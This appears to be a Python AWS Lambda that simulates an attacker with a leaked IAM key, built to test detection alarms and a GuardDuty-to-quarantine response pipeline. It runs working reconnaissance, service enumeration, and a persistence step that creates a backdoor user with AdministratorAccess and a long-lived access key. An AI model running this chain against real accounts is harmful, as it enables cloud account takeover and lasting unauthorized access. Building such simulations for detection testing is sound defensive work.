"""Simulated account-takeover attacker.

Runs the classic leaked-key control-plane chain, signing EVERY call with the
LEAKED IAM user's credentials so CloudTrail attributes the whole story to that
principal (userIdentity.arn = the leaked user), exactly as a real attacker would
look. The Lambda execution role is used for ONE thing only: firing a GuardDuty
sample finding at the end, so the detect->respond pipeline is testable without
waiting days for a real behavioural finding.
"""

import os
import time

import boto3
from botocore.exceptions import ClientError

# Errors you see while a freshly-minted access key propagates through IAM.
KEY_PROPAGATION_ERRORS = {
    "InvalidClientTokenId",
    "AuthFailure",
    "SignatureDoesNotMatch",
    "AccessDenied",
}


def leaked_session():
    """A boto3 session signed with the leaked key -> attributed to the leaked user."""
    return boto3.Session(
        aws_access_key_id=os.environ["LEAKED_AK_ID"],
        aws_secret_access_key=os.environ["LEAKED_SECRET"],
        region_name=os.environ.get("AWS_REGION", "us-east-1"),
    )


def wait_until_live(session, attempts=10):
    """IAM is eventually consistent: a new key isn't usable for a few seconds.

    sts:GetCallerIdentity needs no permissions, so any failure here is pure
    propagation lag. Treat its success as the "key is live" gate.
    """
    sts = session.client("sts")
    delay = 2
    for i in range(attempts):
        try:
            ident = sts.get_caller_identity()
            print(f"[+] key live as {ident['Arn']}")
            return ident
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code not in KEY_PROPAGATION_ERRORS:
                raise
            print(f"[.] attempt {i + 1}: key not live yet ({code}); sleeping {delay}s")
            time.sleep(delay)
            delay = min(delay * 2, 20)
    raise RuntimeError("leaked key never became usable")


def handler(event, context):
    session = leaked_session()
    ident = wait_until_live(session)

    # 1) Orient — the reconnaissance that succeeds.
    iam = session.client("iam")
    s3 = session.client("s3")
    try:
        users = iam.list_users().get("Users", [])
        print(f"[+] iam:ListUsers -> {len(users)} users")
    except ClientError as exc:
        print(f"[-] ListUsers denied ({exc.response['Error']['Code']})")
    try:
        buckets = s3.list_buckets().get("Buckets", [])
        print(f"[+] s3:ListAllMyBuckets -> {len(buckets)} buckets")
    except ClientError as exc:
        print(f"[-] ListBuckets denied ({exc.response['Error']['Code']})")

    # 2) Enumerate — probe services the key does NOT have. Each denial is an
    #    AccessDenied event; the cluster of them is the enumeration burst the
    #    metric-filter alarm watches for.
    probes = [
        ("ec2", "describe_instances"),
        ("secretsmanager", "list_secrets"),
        ("dynamodb", "list_tables"),
        ("lambda", "list_functions"),
        ("rds", "describe_db_instances"),
    ]
    denied = 0
    for svc, op in probes:
        try:
            getattr(session.client(svc), op)()
        except ClientError as exc:
            denied += 1
            print(f"[-] {svc}:{op} denied ({exc.response['Error']['Code']})")
    print(f"[i] {denied} denied probes (enumeration burst)")

    # 3) Persist — create a backdoor admin user + long-lived key. These are the
    #    CreateUser / AttachUserPolicy / CreateAccessKey events the persistence
    #    metric filter fires on.
    prefix = os.environ["PERSIST_PREFIX"]
    backdoor = f"{prefix}-{ident['Account']}"[:64]
    try:
        iam.create_user(
            UserName=backdoor,
            Tags=[
                {"Key": "atkplane:scenario", "Value": "scenario-01"},
                {"Key": "atkplane:ephemeral", "Value": "true"},
            ],
        )
        print(f"[+] iam:CreateUser {backdoor}")
    except ClientError as exc:
        if exc.response["Error"]["Code"] != "EntityAlreadyExists":
            raise
        print("[i] backdoor user already exists (idempotent re-run)")
    try:
        iam.attach_user_policy(
            UserName=backdoor,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print(f"[+] iam:AttachUserPolicy AdministratorAccess -> {backdoor}")
    except ClientError as exc:
        print(f"[-] AttachUserPolicy failed ({exc.response['Error']['Code']})")
    try:
        key = iam.create_access_key(UserName=backdoor)["AccessKey"]
        print(f"[+] iam:CreateAccessKey {key['AccessKeyId']} (persistence)")
    except ClientError as exc:
        print(f"[-] CreateAccessKey failed ({exc.response['Error']['Code']})")

    # 4) Demo helper (NOT the attacker): fire a GuardDuty sample finding via the
    #    execution role so the EventBridge -> quarantine pipeline is exercised
    #    deterministically. Real IAMUser findings need days of baseline.
    detector = os.environ.get("DETECTOR_ID", "")
    if detector:
        try:
            boto3.client("guardduty").create_sample_findings(
                DetectorId=detector,
                FindingTypes=["UnauthorizedAccess:IAMUser/MaliciousIPCaller"],
            )
            print("[+] guardduty sample finding generated")
        except ClientError as exc:
            print(f"[-] create_sample_findings failed ({exc.response['Error']['Code']})")

    return {
        "status": "attack complete",
        "denied_probes": denied,
        "backdoor_user": backdoor,
    }
